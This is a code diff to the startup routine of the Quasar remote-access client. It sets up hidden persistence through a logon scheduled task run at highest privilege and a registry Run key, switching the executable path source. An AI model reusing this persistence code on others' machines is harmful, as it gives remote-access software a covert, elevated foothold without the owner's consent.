@@ -1,9 +1,9 @@
-﻿using System;
-using System.Diagnostics;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using Quasar.Client.Config;
-using Quasar.Client.Data;
 using Quasar.Client.Helper;
+using System;
+using System.Diagnostics;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Setup
 {
@@ -17,7 +17,7 @@ namespace Quasar.Client.Setup
                 {
                     ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                     {
-                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
+                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + Application.ExecutablePath + "\" /rl HIGHEST /f",
                         UseShellExecute = false,
                         CreateNoWindow = true
                     };
@@ -31,13 +31,13 @@ namespace Quasar.Client.Setup
                 }
 
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, Application.ExecutablePath,
                     true);
             }
             else
             {
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, Application.ExecutablePath,
                     true);
             }
         }
